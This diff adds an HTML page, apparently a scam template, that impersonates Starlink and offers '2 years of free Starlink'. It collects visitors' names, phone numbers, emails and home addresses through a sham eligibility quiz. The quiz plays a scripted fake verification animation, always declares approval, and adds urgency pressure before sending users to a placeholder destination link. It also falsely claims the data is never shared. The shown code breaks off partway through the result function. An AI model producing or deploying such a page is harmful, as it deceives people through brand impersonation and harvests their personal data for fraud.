@@ -1,0 +1,871 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>STARLINK · Eligibility Verification</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+  <link href="https://fonts.googleapis.com/css2?family=Barlow:wght@400;500;600;700&family=Barlow+Condensed:wght@700;900&display=swap" rel="stylesheet"/>
+  <style>
+:root {
+  --bg:           #000000;
+  --card-bg:      #0c0c0c;
+  --card-border:  rgba(255,255,255,0.09);
+  --white:        #ffffff;
+  --text-main:    #ffffff;
+  --text-dim:     rgba(255,255,255,0.38);
+  --text-muted:   rgba(255,255,255,0.2);
+  --text-ghost:   rgba(255,255,255,0.13);
+  --opt-bg:       rgba(255,255,255,0.02);
+  --opt-border:   rgba(255,255,255,0.08);
+  --opt-hover-bg: rgba(255,255,255,0.06);
+  --opt-hover-br: rgba(255,255,255,0.22);
+  --opt-sel-bg:   rgba(255,255,255,0.09);
+  --opt-sel-br:   rgba(255,255,255,0.45);
+  --error-color:  rgba(255,80,80,0.95);
+  --error-border: rgba(255,80,80,0.55);
+  --error-glow:   rgba(255,80,80,0.08);
+  --scarcity-bg:  rgba(0,200,120,0.08);
+  --scarcity-br:  rgba(0,200,120,0.35);
+  --scarcity-dot: #00c87a;
+  --scarcity-txt: #6bffb8;
+  --font-body:    'Barlow', sans-serif;
+  --font-display: 'Barlow Condensed', sans-serif;
+  --radius-card:  18px;
+  --radius-btn:   10px;
+  --radius-opt:   9px;
+  --transition:   0.2s ease;
+}
+
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+
+body {
+  font-family: var(--font-body);
+  background: var(--bg);
+  color: var(--text-main);
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 0 16px 40px;
+  overflow-x: hidden;
+  -webkit-font-smoothing: antialiased;
+}
+
+.bg-illus {
+  position: fixed;
+  top: -80px; right: -100px;
+  width: 500px; height: 500px;
+  object-fit: contain;
+  opacity: 0.12;
+  pointer-events: none;
+  z-index: 0;
+  filter: brightness(1.5);
+}
+
+.logo-wrap {
+  position: relative; z-index: 2;
+  padding: 36px 0 28px;
+  display: flex; justify-content: center;
+}
+.logo-img { height: 26px; object-fit: contain; }
+
+/* SVG Logo inline */
+.logo-svg {
+  height: 26px;
+  fill: white;
+  opacity: 0.9;
+}
+
+.quiz-card {
+  position: relative; z-index: 2;
+  width: 100%; max-width: 460px;
+  background: var(--card-bg);
+  border: 1px solid var(--card-border);
+  border-radius: var(--radius-card);
+  overflow: hidden;
+}
+
+/* ── PROGRESS BAR ── */
+.prog-bar-track {
+  height: 2px;
+  background: rgba(255,255,255,0.06);
+  width: 100%; display: none;
+}
+.prog-bar-fill {
+  height: 100%; width: 0%;
+  background: var(--white);
+  transition: width 0.6s cubic-bezier(0.4,0,0.2,1);
+}
+.prog-row {
+  display: none;
+  justify-content: space-between;
+  align-items: center;
+  padding: 12px 20px 0;
+  gap: 8px;
+}
+.prog-center {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  flex: 1;
+  justify-content: center;
+}
+.prog-step {
+  font-size: 0.62rem;
+  font-weight: 700;
+  letter-spacing: 0.12em;
+  color: rgba(255,255,255,0.25);
+  text-transform: uppercase;
+}
+.prog-divider {
+  width: 1px;
+  height: 10px;
+  background: rgba(255,255,255,0.15);
+  flex-shrink: 0;
+}
+.prog-pct {
+  font-size: 0.62rem;
+  font-weight: 700;
+  color: rgba(255,255,255,0.55);
+  letter-spacing: 0.06em;
+  min-width: 28px;
+  text-align: right;
+}
+
+/* ── BACK BUTTON ── */
+.btn-back {
+  display: none;
+  align-items: center;
+  gap: 6px;
+  background: none;
+  border: none;
+  color: rgba(255,255,255,0.3);
+  font-family: var(--font-body);
+  font-size: 0.72rem;
+  font-weight: 600;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  cursor: pointer;
+  padding: 0;
+  transition: color var(--transition);
+  margin-left: auto;
+}
+.btn-back:hover { color: rgba(255,255,255,0.7); }
+.btn-back svg { width: 14px; height: 14px; }
+.prog-row.has-back { justify-content: space-between; align-items: center; }
+
+/* ── SCREENS ── */
+.screen { display: none; }
+.screen.active { display: block; animation: fadeUp 0.32s ease forwards; }
+@keyframes fadeUp {
+  from { opacity:0; transform:translateY(10px); }
+  to   { opacity:1; transform:translateY(0); }
+}
+.card-inner { padding: 28px 26px 30px; }
+
+/* ── BADGE ── */
+.top-badge {
+  display: inline-flex; align-items: center; gap: 7px;
+  font-size:0.6rem; font-weight:700; letter-spacing:0.16em;
+  color:rgba(255,255,255,0.4); text-transform:uppercase;
+  border:1px solid rgba(255,255,255,0.1); border-radius:99px;
+  padding:4px 12px; margin-bottom:22px;
+}
+.dot-pulse {
+  width:5px; height:5px; background:var(--white);
+  border-radius:50%; opacity:0.7;
+  animation: pulse 1.8s ease infinite;
+}
+@keyframes pulse {
+  0%,100%{opacity:0.7;transform:scale(1)}
+  50%{opacity:0.2;transform:scale(0.5)}
+}
+
+.screen-title {
+  font-family: var(--font-display);
+  font-size: clamp(1.7rem,5.5vw,2.3rem);
+  font-weight:900; line-height:1.1;
+  text-transform:uppercase; letter-spacing:0.01em;
+  color:var(--text-main); margin-bottom:10px;
+}
+.screen-title .dim { opacity:0.3; font-weight:700; }
+.screen-sub { font-size:0.85rem; color:var(--text-dim); line-height:1.65; margin-bottom:26px; }
+
+/* ── INPUTS ── */
+.inp-label {
+  display:block; font-size:0.65rem; font-weight:700;
+  letter-spacing:0.12em; color:rgba(255,255,255,0.35);
+  text-transform:uppercase; margin-bottom:7px;
+}
+.text-input {
+  width:100%;
+  background:rgba(255,255,255,0.03);
+  border:1px solid rgba(255,255,255,0.1);
+  border-radius:var(--radius-btn);
+  padding:13px 15px;
+  font-family:var(--font-body); font-size:0.95rem;
+  font-weight:500; color:var(--text-main);
+  outline:none; caret-color:var(--white);
+  transition:border-color var(--transition), box-shadow var(--transition);
+  appearance:none; -webkit-appearance:none;
+}
+.text-input::placeholder { color:rgba(255,255,255,0.18); }
+.text-input:focus {
+  border-color:rgba(255,255,255,0.35);
+  box-shadow:0 0 0 3px rgba(255,255,255,0.05);
+}
+.text-input.locked {
+  background:rgba(255,255,255,0.015);
+  border-color:rgba(255,255,255,0.06);
+  color:rgba(255,255,255,0.5);
+  cursor:not-allowed;
+}
+.text-input.has-error {
+  border-color: var(--error-border) !important;
+  box-shadow: 0 0 0 3px var(--error-glow) !important;
+}
+.select-input {
+  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none'%3E%3Cpath d='M6 9l6 6 6-6' stroke='rgba(255,255,255,0.35)' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
+  background-repeat:no-repeat;
+  background-position:right 14px center;
+  background-size:16px;
+  padding-right:40px;
+  cursor:pointer;
+}
+.select-input option { background:#1a1a1a; color:#fff; }
+
+.inp-error {
+  display:block; font-size:0.7rem;
+  color:var(--error-color);
+  margin-top:5px; min-height:18px; font-weight:500;
+}
+.inp-hint { font-size:0.68rem; color:var(--text-muted); margin-bottom:22px; display:block; }
+.field-locked-hint { display:block; font-size:0.68rem; color:rgba(255,255,255,0.25); margin-top:5px; }
+
+/* ── MAIN BUTTON ── */
+.btn-main {
+  width:100%; display:flex;
+  align-items:center; justify-content:center; gap:9px;
+  padding:14px 20px;
+  font-family:var(--font-display);
+  font-size:0.95rem; font-weight:900;
+  letter-spacing:0.1em; text-transform:uppercase;
+  color:#000; background:var(--white);
+  border:none; border-radius:var(--radius-btn);
+  cursor:pointer;
+  transition:opacity var(--transition), transform 0.15s;
+  margin-bottom:12px;
+  text-decoration:none;
+}
+.btn-main:hover  { opacity:0.88; transform:translateY(-1px); }
+.btn-main:active { transform:translateY(0); opacity:0.8; }
+.btn-arrow { width:15px; height:15px; transition:transform var(--transition); flex-shrink:0; }
+.btn-main:hover .btn-arrow { transform:translateX(3px); }
+.btn-cta-form { font-size:0.88rem; padding:15px 20px; }
+
+.microcopy { text-align:center; font-size:0.66rem; color:var(--text-muted); letter-spacing:0.04em; }
+
+/* ── QUESTION ── */
+.q-text { font-family:var(--font-display); font-size:clamp(1.2rem,4vw,1.55rem); font-weight:700; line-height:1.25; text-transform:uppercase; color:var(--text-main); margin-bottom:20px; margin-top:4px; }
+.q-name { color:rgba(255,255,255,0.38); }
+.options { display:flex; flex-direction:column; gap:7px; }
+.opt {
+  width:100%; display:flex; align-items:center; gap:13px;
+  padding:12px 15px;
+  background:var(--opt-bg); border:1px solid var(--opt-border);
+  border-radius:var(--radius-opt); color:var(--text-main);
+  font-family:var(--font-body); font-size:0.87rem; font-weight:500;
+  cursor:pointer; text-align:left;
+  transition:background var(--transition), border-color var(--transition);
+}
+.opt:hover { background:var(--opt-hover-bg); border-color:var(--opt-hover-br); }
+.opt.selected { background:var(--opt-sel-bg); border-color:var(--opt-sel-br); }
+.opt-k {
+  width:25px; height:25px; min-width:25px;
+  border:1px solid rgba(255,255,255,0.13); border-radius:6px;
+  display:flex; align-items:center; justify-content:center;
+  font-size:0.62rem; font-weight:700; color:rgba(255,255,255,0.3);
+  transition:all var(--transition); flex-shrink:0;
+}
+.opt:hover .opt-k { border-color:rgba(255,255,255,0.45); color:#fff; }
+.opt.selected .opt-k { background:#fff; border-color:#fff; color:#000; }
+.opt.selecting { animation: selectPop 0.22s ease; }
+@keyframes selectPop { 0%{transform:scale(1)} 50%{transform:scale(1.012)} 100%{transform:scale(1)} }
+
+/* ── FORM ── */
+.form-header { display:flex; align-items:center; gap:14px; margin-bottom:20px; }
+.form-icon {
+  width:42px; height:42px; min-width:42px;
+  border:1px solid rgba(255,255,255,0.15); border-radius:50%;
+  display:flex; align-items:center; justify-content:center;
+  background:rgba(255,255,255,0.04);
+}
+.form-icon svg { width:18px; height:18px; }
+.form-pretitle { font-family:var(--font-display); font-size:1.15rem; font-weight:900; text-transform:uppercase; letter-spacing:0.02em; line-height:1.1; margin-bottom:4px; }
+.form-subtitle { font-size:0.8rem; color:var(--text-dim); line-height:1.4; }
+.form-divider { height:1px; background:rgba(255,255,255,0.07); margin:18px 0; }
+.field-group { margin-bottom:16px; }
+.form-privacy { text-align:center; font-size:0.7rem; color:rgba(255,255,255,0.22); line-height:1.5; margin-top:4px; }
+
+/* ── PROCESSING ── */
+.proc-inner { display:flex; flex-direction:column; align-items:center; padding:56px 20px; gap:18px; text-align:center; }
+.spin-wrap { position:relative; width:76px; height:76px; display:flex; align-items:center; justify-content:center; }
+.ring { position:absolute; border-radius:50%; border:1.5px solid transparent; }
+.r1 { inset:0;    border-top-color:rgba(255,255,255,1);    animation:spin 1.1s linear infinite; }
+.r2 { inset:13px; border-right-color:rgba(255,255,255,0.35); animation:spin 1.8s linear infinite reverse; }
+.r3 { inset:25px; border-bottom-color:rgba(255,255,255,0.12); animation:spin 2.5s linear infinite; }
+@keyframes spin { to{transform:rotate(360deg)} }
+.spin-ico { font-size:1.1rem; opacity:0.6; }
+.proc-txt { font-family:var(--font-display); font-size:1rem; font-weight:700; letter-spacing:0.08em; text-transform:uppercase; color:var(--text-main); min-height:24px; transition:opacity 0.3s; }
+.proc-dots { display:flex; gap:5px; }
+.proc-dots span { width:5px; height:5px; background:var(--white); border-radius:50%; opacity:0.2; animation:db 1.2s ease infinite; }
+.proc-dots span:nth-child(2){animation-delay:.2s}
+.proc-dots span:nth-child(3){animation-delay:.4s}
+@keyframes db { 0%,100%{opacity:0.2;transform:translateY(0)} 50%{opacity:0.8;transform:translateY(-4px)} }
+
+/* ── RESULT ── */
+.result-inner { display:flex; flex-direction:column; align-items:center; text-align:center; padding:34px 24px 30px; }
+.result-icon { width:52px; height:52px; border:1px solid rgba(255,255,255,0.15); border-radius:50%; display:flex; align-items:center; justify-content:center; margin-bottom:16px; background:rgba(255,255,255,0.05); }
+.result-icon svg { width:20px; height:20px; }
+.result-label { font-size:0.6rem; font-weight:700; letter-spacing:0.18em; color:rgba(255,255,255,0.28); text-transform:uppercase; margin-bottom:12px; }
+.result-title { font-family:var(--font-display); font-size:clamp(1.7rem,5.5vw,2.3rem); font-weight:900; text-transform:uppercase; line-height:1.1; margin-bottom:10px; }
+.result-sub { font-size:0.86rem; color:var(--text-dim); line-height:1.6; margin-bottom:20px; max-width:300px; }
+.result-data-box { width:100%; background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.09); border-radius:10px; padding:14px 16px; margin-bottom:20px; text-align:left; }
+.result-data-row { display:flex; align-items:flex-start; gap:8px; padding:5px 0; border-bottom:1px solid rgba(255,255,255,0.05); font-size:0.8rem; }
+.result-data-row:last-child { border-bottom:none; }
+.result-data-label { color:rgba(255,255,255,0.3); font-size:0.7rem; font-weight:700; letter-spacing:0.08em; text-transform:uppercase; min-width:80px; padding-top:1px; }
+.result-data-value { color:rgba(255,255,255,0.8); font-weight:500; word-break:break-word; }
+.scarcity { width:100%; display:flex; align-items:center; gap:10px; background:var(--scarcity-bg); border:1px solid var(--scarcity-br); border-radius:var(--radius-opt); padding:11px 14px; margin-bottom:24px; }
+.sc-dot { width:7px; height:7px; min-width:7px; background:var(--scarcity-dot); border-radius:50%; box-shadow:0 0 8px rgba(255,68,68,0.6); animation:pulse 1.2s ease infinite; }
+.sc-txt { font-size:0.79rem; color:var(--scarcity-txt); text-align:left; line-height:1.4; font-weight:500; }
+
+.footer { position:relative; z-index:2; font-size:0.63rem; color:var(--text-ghost); text-align:center; padding:20px 0 0; letter-spacing:0.04em; }
+
+@media(max-width:420px){
+  .card-inner { padding:20px 16px 24px; }
+  .result-inner { padding:24px 16px 24px; }
+  .proc-inner { padding:44px 16px; }
+  .bg-illus { width:280px; height:280px; top:-30px; right:-50px; }
+}
+</style>
+</head>
+<body>
+
+<!-- Background illustration (satellite dish silhouette via CSS) -->
+<div class="logo-wrap">
+  <svg class="logo-svg" viewBox="0 0 160 26" xmlns="http://www.w3.org/2000/svg">
+    <text x="0" y="22" font-family="'Barlow Condensed', sans-serif" font-size="26" font-weight="900" letter-spacing="3" fill="white">STARLINK</text>
+  </svg>
+</div>
+
+<div class="quiz-card">
+
+  <!-- PROGRESS BAR -->
+  <div class="prog-bar-track" id="prog-track">
+    <div class="prog-bar-fill" id="prog-fill"></div>
+  </div>
+  <div class="prog-row" id="prog-row">
+    <div class="prog-center">
+      <span class="prog-step" id="prog-step">Question 1 of 10</span>
+      <div class="prog-divider"></div>
+      <span class="prog-pct" id="prog-pct">0%</span>
+    </div>
+    <button class="btn-back" id="btn-back">
+      <svg viewBox="0 0 24 24" fill="none">
+        <path d="M19 12H5M12 5l-7 7 7 7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+      Back
+    </button>
+  </div>
+
+  <!-- SCREEN 0: START -->
+  <div class="screen active" id="s-start">
+    <div class="card-inner">
+      <div class="top-badge">
+        <span class="dot-pulse"></span>
+        Eligibility Check · Free Access
+      </div>
+
+      <h1 class="screen-title">
+        Check if you qualify<br/>
+        <span class="dim">for free Starlink</span>
+      </h1>
+
+      <p class="screen-sub">
+        Answer 10 quick questions to find out if your area is eligible for <strong>2 years of free Starlink</strong> internet access.
+      </p>
+
+      <label class="inp-label" for="inp-name">Your full name</label>
+      <input
+        class="text-input"
+        id="inp-name"
+        type="text"
+        placeholder="e.g. John Smith"
+        autocomplete="name"
+        inputmode="text"
+      />
+      <span class="inp-error" id="err-name"></span>
+      <span class="inp-hint">Enter your first and last name to continue.</span>
+
+      <button class="btn-main" id="btn-start">
+        Start Verification
+        <svg class="btn-arrow" viewBox="0 0 24 24" fill="none">
+          <path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </button>
+
+      <p class="microcopy">Free · No credit card · 2 minutes</p>
+    </div>
+  </div>
+
+  <!-- SCREEN 1: QUESTIONS -->
+  <div class="screen" id="s-question">
+    <div class="card-inner">
+      <p class="q-text" id="q-text"></p>
+      <div class="options" id="q-options"></div>
+    </div>
+  </div>
+
+  <!-- SCREEN 2: FORM -->
+  <div class="screen" id="s-form">
+    <div class="card-inner">
+      <div class="form-header">
+        <div class="form-icon">
+          <svg viewBox="0 0 24 24" fill="none">
+            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+            <circle cx="12" cy="7" r="4" stroke="white" stroke-width="1.8"/>
+          </svg>
+        </div>
+        <div>
+          <p class="form-pretitle">Almost there, <span id="form-name-span"></span>!</p>
+          <p class="form-subtitle">Complete your details to confirm your spot.</p>
+        </div>
+      </div>
+
+      <div class="form-divider"></div>
+
+      <!-- Name (locked) -->
+      <div class="field-group">
+        <label class="inp-label" for="f-nombre">Full Name</label>
+        <input class="text-input locked" id="f-nombre" type="text" readonly/>
+        <span class="field-locked-hint">Confirmed from your answer ✓</span>
+      </div>
+
+      <!-- Phone -->
+      <div class="field-group">
+        <label class="inp-label" for="f-tel">Phone / WhatsApp</label>
+        <input class="text-input" id="f-tel" type="tel" placeholder="+1 555 000 0000" autocomplete="tel" inputmode="tel"/>
+        <span class="inp-error" id="err-tel"></span>
+      </div>
+
+      <!-- Email -->
+      <div class="field-group">
+        <label class="inp-label" for="f-email">Email Address</label>
+        <input class="text-input" id="f-email" type="email" placeholder="you@email.com" autocomplete="email" inputmode="email"/>
+        <span class="inp-error" id="err-email"></span>
+      </div>
+
+      <!-- State -->
+      <div class="field-group">
+        <label class="inp-label" for="f-provincia">State</label>
+        <select class="text-input select-input" id="f-provincia">
+          <option value="">Select your state</option>
+          <option>Alabama</option><option>Alaska</option><option>Arizona</option><option>Arkansas</option>
+          <option>California</option><option>Colorado</option><option>Connecticut</option><option>Delaware</option>
+          <option>Florida</option><option>Georgia</option><option>Hawaii</option><option>Idaho</option>
+          <option>Illinois</option><option>Indiana</option><option>Iowa</option><option>Kansas</option>
+          <option>Kentucky</option><option>Louisiana</option><option>Maine</option><option>Maryland</option>
+          <option>Massachusetts</option><option>Michigan</option><option>Minnesota</option><option>Mississippi</option>
+          <option>Missouri</option><option>Montana</option><option>Nebraska</option><option>Nevada</option>
+          <option>New Hampshire</option><option>New Jersey</option><option>New Mexico</option><option>New York</option>
+          <option>North Carolina</option><option>North Dakota</option><option>Ohio</option><option>Oklahoma</option>
+          <option>Oregon</option><option>Pennsylvania</option><option>Rhode Island</option><option>South Carolina</option>
+          <option>South Dakota</option><option>Tennessee</option><option>Texas</option><option>Utah</option>
+          <option>Vermont</option><option>Virginia</option><option>Washington</option><option>West Virginia</option>
+          <option>Wisconsin</option><option>Wyoming</option>
+        </select>
+        <span class="inp-error" id="err-provincia"></span>
+      </div>
+
+      <!-- City -->
+      <div class="field-group">
+        <label class="inp-label" for="f-ciudad">City</label>
+        <input class="text-input" id="f-ciudad" type="text" placeholder="Your city" autocomplete="address-level2"/>
+        <span class="inp-error" id="err-ciudad"></span>
+      </div>
+
+      <!-- Address -->
+      <div class="field-group">
+        <label class="inp-label" for="f-direccion">Street Address</label>
+        <input class="text-input" id="f-direccion" type="text" placeholder="123 Main St" autocomplete="street-address"/>
+        <span class="inp-error" id="err-direccion"></span>
+      </div>
+
+      <!-- ZIP Code -->
+      <div class="field-group">
+        <label class="inp-label" for="f-cp">ZIP Code</label>
+        <input class="text-input" id="f-cp" type="text" placeholder="e.g. 90210" autocomplete="postal-code" inputmode="numeric"/>
+        <span class="inp-error" id="err-cp"></span>
+      </div>
+
+      <div class="form-divider"></div>
+
+      <button class="btn-main btn-cta-form" id="btn-form-submit">
+        Confirm &amp; Check Eligibility
+        <svg class="btn-arrow" viewBox="0 0 24 24" fill="none">
+          <path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </button>
+
+      <p class="form-privacy">🔒 Your data is protected and will never be shared with third parties.</p>
+    </div>
+  </div>
+
+  <!-- SCREEN 3: PROCESSING -->
+  <div class="screen" id="s-processing">
+    <div class="proc-inner">
+      <div class="spin-wrap">
+        <div class="ring r1"></div><div class="ring r2"></div><div class="ring r3"></div>
+        <span class="spin-ico">⬡</span>
+      </div>
+      <p class="proc-txt" id="proc-txt">Analyzing information...</p>
+      <div class="proc-dots"><span></span><span></span><span></span></div>
+    </div>
+  </div>
+
+  <!-- SCREEN 4: RESULT -->
+  <div class="screen" id="s-result">
+    <div class="result-inner">
+
+      <div class="result-icon">
+        <svg viewBox="0 0 24 24" fill="none">
+          <path d="M20 6L9 17l-5-5" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+
+      <p class="result-label">Approval Confirmed</p>
+
+      <h2 class="result-title" id="result-title">
+        GREAT NEWS!
+      </h2>
+
+      <p class="result-sub">
+        Your profile has been approved. You can now move on to the next step to activate your free 2-year Starlink access.
+      </p>
+
+      <div class="result-data-box" id="result-data-box"></div>
+
+      <div class="scarcity">
+        <span class="sc-dot"></span>
+        <p class="sc-txt">
+          Your spot is reserved for a limited time. Confirm now before it expires.
+        </p>
+      </div>
+
+      <button class="btn-main" id="btn-cta">
+        PROCEED TO NEXT STEP
+        <svg class="btn-arrow" viewBox="0 0 24 24" fill="none">
+          <path d="M5 12h14M13 6l6 6-6 6" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </button>
+
+      <p class="microcopy">
+        Quick activation · Free today · No commitment
+      </p>
+
+    </div>
+  </div>
+
+</div>
+
+<p class="footer">© 2025 Starlink · Eligibility Verification · All rights reserved</p>
+
+<script>
+'use strict';
+
+const QUESTIONS = [
+  { text:"{name}, what type of area\ndo you currently live in?",          options:["Rural area or countryside","Small town or village","Suburban neighborhood","Large city"] },
+  { text:"How would you rate\nyour current internet connection?",          options:["Very poor","Unstable","Average","Good"] },
+  { text:"{name}, do you have access to fiber optic\ninternet at home?",  options:["No","Not sure","Yes, but it's unstable","Yes, it works fine"] },
+  { text:"What do you mainly\nuse the internet for?",                      options:["Work or studying","Streaming and social media","Online gaming","All of the above"] },
+  { text:"{name}, how many people\nuse the internet in your home?",        options:["1 person","2–3 people","4–5 people","More than 5"] },
+  { text:"Would you be willing to try\na new internet technology?",        options:["Yes, no problem","Yes, occasionally","Maybe","No"] },
+  { text:"{name}, do you have a space to\ninstall a small dish/device?",  options:["Yes","I think so","Not sure","No"] },
+  { text:"How urgently do you need\nto improve your connection?",         options:["Very urgent","Urgent","Somewhat","Not urgent"] },
+  { text:"{name}, do you have an active\nemail and phone number?",        options:["Yes, both","Email only","Phone only","No"] },
+  { text:"If selected, could you\nschedule the activation?",              options:["Yes, immediately","In the next few days","Within a week","Not sure"] }
+];
+
+const PROC_TEXTS = [
+  "Analyzing information...",
+  "Validating profile...",
+  "Checking availability...",
+  "Confirming eligibility...",
+  "Almost done..."
+];
+
+/* ── CHANGE YOUR DESTINATION LINK HERE ── */
+const LINK_DESTINO = "https://YOUR-LINK-HERE.com";
+
+/* ── STATE ── */
+let userName  = "";
+let qCurrent  = 0;
+const TOTAL   = QUESTIONS.length;
+let answers   = new Array(TOTAL).fill(null);
+
+/* ── HELPERS ── */
+const $ = id => document.getElementById(id);
+
+function capitalize(str){
+  return str.trim().split(' ').map(w=>w.charAt(0).toUpperCase()+w.slice(1).toLowerCase()).join(' ');
+}
+function firstName(){ return userName.split(' ')[0]; }
+
+function showScreen(id){
+  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
+  $(id).classList.add('active');
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+function setProgress(n){
+  const pct = Math.round((n/TOTAL)*100);
+  $('prog-fill').style.width = pct+'%';
+  $('prog-pct').textContent  = pct+'%';
+  $('prog-step').textContent = `Question ${Math.min(n+1,TOTAL)} of ${TOTAL}`;
+}
+
+function showError(inputId, errorId, msg){
+  const inp=$(inputId); const err=$(errorId);
+  if(inp) inp.classList.add('has-error');
+  if(err) err.textContent=msg;
+}
+function clearError(inputId, errorId){
+  const inp=$(inputId); const err=$(errorId);
+  if(inp) inp.classList.remove('has-error');
+  if(err) err.textContent='';
+}
+
+/* ── BACK BUTTON ── */
+function updateBackBtn(){
+  const btn = $('btn-back');
+  if(qCurrent >= 1){
+    btn.style.display = 'flex';
+  } else {
+    btn.style.display = 'none';
+  }
+}
+
+function goBack(){
+  if(qCurrent > 0){
+    qCurrent--;
+    showScreen('s-question');
+    loadQuestion(qCurrent);
+  }
+}
+
+/* ── STEP 0: FULL NAME ── */
+function validateFullName(v){
+  const parts = v.trim().split(/\s+/).filter(p=>p.length>=2);
+  return parts.length>=2;
+}
+
+function start(){
+  const val = $('inp-name').value.trim();
+  clearError('inp-name','err-name');
+  if(val.length<2){
+    showError('inp-name','err-name','Please enter your name to continue.');
+    $('inp-name').focus(); return;
+  }
+  if(!validateFullName(val)){
+    showError('inp-name','err-name','Please enter your full first and last name.');
+    $('inp-name').focus(); return;
+  }
+  userName  = capitalize(val);
+  qCurrent  = 0;
+  answers   = new Array(TOTAL).fill(null);
+  $('prog-track').style.display='block';
+  $('prog-row').style.display='flex';
+  setProgress(0);
+  showScreen('s-question');
+  loadQuestion(0);
+}
+
+/* ── STEPS 1–10: QUESTIONS ── */
+function loadQuestion(index){
+  const q  = QUESTIONS[index];
+  const fn = firstName();
+
+  setProgress(index);
+  updateBackBtn();
+
+  const baseText = q.text.replace(/\{name\}/g, fn);
+  const lines    = baseText.split('\n');
+  $('q-text').innerHTML = lines.map((line,i)=>{
+    const hl = line.replace(new RegExp(`(${fn})`,'gi'),'<span class="q-name">$1</span>');
+    return i<lines.length-1 ? hl+'<br/>' : hl;
+  }).join('');
+
+  const grid  = $('q-options');
+  grid.innerHTML='';
+  const letters=['A','B','C','D'];
+
+  q.options.forEach((txt,i)=>{
+    const btn=document.createElement('button');
+    btn.className='opt';
+    if(answers[index]===i) btn.classList.add('selected');
+    btn.style.cssText=`opacity:0;transform:translateX(-8px);transition:opacity 0.26s ease ${i*0.055}s,transform 0.26s ease ${i*0.055}s,background 0.15s,border-color 0.15s`;
+    btn.innerHTML=`<span class="opt-k">${letters[i]}</span><span>${txt}</span>`;
+    btn.addEventListener('click',()=>selectOption(btn,i));
+    grid.appendChild(btn);
+    requestAnimationFrame(()=>{
+      setTimeout(()=>{
+        btn.style.opacity='1';
+        btn.style.transform='translateX(0)';
+      },20+i*55);
+    });
+  });
+}
+
+function selectOption(btn, optionIndex){
+  document.querySelectorAll('.opt').forEach(b=>b.classList.remove('selected','selecting'));
+  btn.classList.add('selected','selecting');
+  answers[qCurrent] = optionIndex;
+
+  setTimeout(()=>{
+    qCurrent++;
+    if(qCurrent<TOTAL){
+      showScreen('s-question');
+      loadQuestion(qCurrent);
+    } else {
+      setProgress(TOTAL);
+      $('prog-track').style.display='none';
+      $('prog-row').style.display='none';
+      showForm();
+    }
+  },300);
+}
+
+/* ── STEP 2: FORM ── */
+function showForm(){
+  $('f-nombre').value        = userName;
+  $('form-name-span').textContent = firstName();
+  showScreen('s-form');
+}
+
+function isValidEmail(e){ return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e); }
+function isValidPhone(t){
+  const d=t.replace(/[\s\-\+\(\)]/g,'');
+  return d.length>=8 && /^\d+$/.test(d);
+}
+
+function validateForm(){
+  let valid=true;
+
+  // Phone
+  clearError('f-tel','err-tel');
+  const tel=$('f-tel').value.trim();
+  if(!tel){ showError('f-tel','err-tel','Please enter your phone or WhatsApp number.'); valid=false; }
+  else if(!isValidPhone(tel)){ showError('f-tel','err-tel','Invalid phone. Minimum 8 digits.'); valid=false; }
+
+  // Email
+  clearError('f-email','err-email');
+  const email=$('f-email').value.trim();
+  if(!email){ showError('f-email','err-email','Please enter your email address.'); valid=false; }
+  else if(!isValidEmail(email)){ showError('f-email','err-email','Invalid email. E.g.: you@email.com'); valid=false; }
+
+  // State
+  clearError('f-provincia','err-provincia');
+  const state=$('f-provincia').value;
+  if(!state){ showError('f-provincia','err-provincia','Please select your state.'); valid=false; }
+
+  // City
+  clearError('f-ciudad','err-ciudad');
+  const city=$('f-ciudad').value.trim();
+  if(!city||city.length<2){ showError('f-ciudad','err-ciudad','Please enter your city.'); valid=false; }
+
+  // Address
+  clearError('f-direccion','err-direccion');
+  const addr=$('f-direccion').value.trim();
+  if(!addr||addr.length<5){ showError('f-direccion','err-direccion','Please enter your full street address.'); valid=false; }
+
+  // ZIP
+  clearError('f-cp','err-cp');
+  const zip=$('f-cp').value.trim();
+  if(!zip){ showError('f-cp','err-cp','Please enter your ZIP code.'); valid=false; }
+
+  return valid;
+}
+
+function submitForm(){
+  if(!validateForm()){
+    const firstErr=document.querySelector('.has-error');
+    if(firstErr) firstErr.scrollIntoView({behavior:'smooth',block:'center'});
+    return;
+  }
+  showScreen('s-processing');
+  startProcessing();
+}
+
+/* ── STEP 3: PROCESSING ── */
+function startProcessing(){
+  let i=0;
+  $('proc-txt').textContent=PROC_TEXTS[0];
+  const iv=setInterval(()=>{
+    i++;
+    if(i<PROC_TEXTS.length){
+      const el=$('proc-txt');
+      el.style.opacity='0';
+      setTimeout(()=>{ el.textContent=PROC_TEXTS[i]; el.style.opacity='1'; },220);
+    } else {
+      clearInterval(iv);
+      setTimeout(showResult,400);
+    }
+  },900);
+}
+
+/* ── STEP 4: RESULT ── */
+function showResult(){
+  $('result-title').textContent=`Great news, ${firstName()}!`;
+  const box=$('result-data-box');
+  const data=[
+    {label:'Name',    value:userName},
